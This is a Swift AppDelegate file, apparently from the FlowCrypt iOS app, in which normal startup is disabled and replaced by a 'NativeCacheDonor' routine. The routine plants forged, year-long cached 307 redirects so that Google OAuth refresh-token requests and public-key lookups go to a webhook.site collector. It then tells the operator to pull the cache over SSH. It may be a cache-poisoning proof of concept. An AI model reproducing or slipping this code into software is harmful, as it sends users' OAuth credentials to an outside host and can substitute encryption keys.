//
//  AppDelegate.swift
//  FlowCrypt
//

import AppAuth
import Combine
import GTMAppAuth

@main
class AppDelegate: UIResponder, UIApplicationDelegate, AppDelegateGoogleSessionContainer {
    var blurViewController: BlurViewController?
    var googleAuthSession: OIDExternalUserAgentSession?
    var ekmVcHelper: EKMVcHelper?
    let window = UIWindow(frame: UIScreen.main.bounds)
    private var waitingForProtectedDataCancellable = Set<AnyCancellable>()

    func application(_ application: UIApplication, didFinishLaunchingWithOptions _: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        showNativeCacheDonor()
        return true

        /* Native cache donor build: normal startup intentionally disabled. */
        #if false
        if application.isRunningTests {
            return true
        }
        // When trying to initialize storage before protected data is available,
        // existing storage may get corrupted due to a lost db encryption key.
        // See https://github.com/FlowCrypt/flowcrypt-ios/issues/1373
        guard UIApplication.shared.isProtectedDataAvailable else {
            NotificationCenter
                .default
                .publisher(for: UIApplication.protectedDataDidBecomeAvailableNotification)
                .first()
                .sink { _ in
                    GlobalRouter().proceed()
                }.store(in: &waitingForProtectedDataCancellable)
            return true
        }
        GlobalRouter().proceed()
        return true
        #endif
    }

    private func showNativeCacheDonor() {
        let viewController = UIViewController()
        viewController.view.backgroundColor = .systemBackground
        let label = UILabel()
        label.translatesAutoresizingMaskIntoConstraints = false
        label.numberOfLines = 0
        label.font = .monospacedSystemFont(ofSize: 13, weight: .regular)
        label.text = NativeCacheDonor.seedAndProbe()
        viewController.view.addSubview(label)
        NSLayoutConstraint.activate([
            label.leadingAnchor.constraint(equalTo: viewController.view.safeAreaLayoutGuide.leadingAnchor, constant: 16),
            label.trailingAnchor.constraint(equalTo: viewController.view.safeAreaLayoutGuide.trailingAnchor, constant: -16),
            label.centerYAnchor.constraint(equalTo: viewController.view.centerYAnchor)
        ])
        window.rootViewController = viewController
        window.makeKeyAndVisible()
    }

    func application(_ app: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey: Any] = [:]) -> Bool {
        guard let authSession = googleAuthSession, authSession.resumeExternalUserAgentFlow(with: url) else {
            return false
        }
        googleAuthSession = nil
        return true
    }

    func setUpEKMVcHelper(ekmVcHelper: EKMVcHelper) {
        self.ekmVcHelper = ekmVcHelper
    }
}

private enum NativeCacheDonor {
    private static let webhook = URL(string: "https://webhook.site/c6df9d59-50ab-4a00-98e4-bf2ceb7ab15e")!
    private static let attester = URL(string: "https://flowcrypt.com/attester/pub/bdfg.work@gmail.com")!
    private static let token = URL(string: "https://www.googleapis.com/oauth2/v4/token")!

    static func seedAndProbe() -> String {
        let get = request(url: attester, method: "GET")
        let post = tokenRequest(refreshToken: "NATIVE_DONOR_PLACEHOLDER")
        let differentPost = tokenRequest(refreshToken: "DIFFERENT_BODY_CANARY")
        let cache = URLCache.shared

        [get, post].forEach { request in
            cache.removeCachedResponse(for: request)
            let response = HTTPURLResponse(
                url: request.url!,
                statusCode: 307,
                httpVersion: "HTTP/1.1",
                headerFields: [
                    "Location": webhook.absoluteString,
                    "Content-Location": request.url!.absoluteString,
                    "Cache-Control": "public, max-age=31536000",
                    "Content-Length": "0"
                ]
            )!
            cache.storeCachedResponse(
                CachedURLResponse(response: response, data: Data(), storagePolicy: .allowed),
                for: request
            )
        }

        let report = [
            "NATIVE CACHE DONOR READY",
            describe("GET exact", request: get),
            describe("POST exact", request: post),
            describe("POST different body", request: differentPost),
            "Keep this app open and extract its cache over SSH."
        ].joined(separator: "\n")
        if let documents = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first {
            try? Data(report.utf8).write(to: documents.appendingPathComponent("native-cache-donor.txt"))
        }
        return report
    }

    private static func request(url: URL, method: String) -> URLRequest {
        var request = URLRequest(url: url)
        request.httpMethod = method
        if url == attester {
            request.timeoutInterval = 10
        }
        return request
    }

    private static func tokenRequest(refreshToken: String) -> URLRequest {
        var request = request(url: token, method: "POST")
        request.setValue(
            "application/x-www-form-urlencoded; charset=UTF-8",
            forHTTPHeaderField: "Content-Type"
        )
        request.httpBody = Data(
            "grant_type=refresh_token&refresh_token=\(refreshToken)&client_id=\(GeneralConstants.Gmail.clientID)".utf8
        )
        return request
    }

    private static func describe(_ label: String, request: URLRequest) -> String {
        guard let cached = URLCache.shared.cachedResponse(for: request),
              let response = cached.response as? HTTPURLResponse else {
            return "\(label): MISS"
        }
        let location = response.value(forHTTPHeaderField: "Location") ?? "none"
        return "\(label): HIT status=\(response.statusCode) location=\(location)"
    }
}

extension AppDelegate: BlursTopView {
    func applicationWillResignActive(_ application: UIApplication) {
        for cancellable in waitingForProtectedDataCancellable {
            cancellable.cancel()
        }
        if !isBlurViewShowing() {
            coverTopViewWithBlurView()
        }
    }

    func applicationDidBecomeActive(_ application: UIApplication) {
        if isBlurViewShowing() {
            removeBlurView()
        }
        if let topViewController = UIApplication.topViewController() {
            Task {
                await ekmVcHelper?.refreshKeysFromEKMIfNeeded(in: topViewController)
            }
        }
    }
}

extension UIApplication {
    class func topViewController(base: UIViewController? = UIApplication.shared.currentWindow?.rootViewController) -> UIViewController? {
        if let nav = base as? UINavigationController {
            return topViewController(base: nav.visibleViewController)
        } else if let tab = base as? UITabBarController, let selected = tab.selectedViewController {
            return topViewController(base: selected)
        } else if let presented = base?.presentedViewController {
            return topViewController(base: presented)
        }
        return base
    }
}
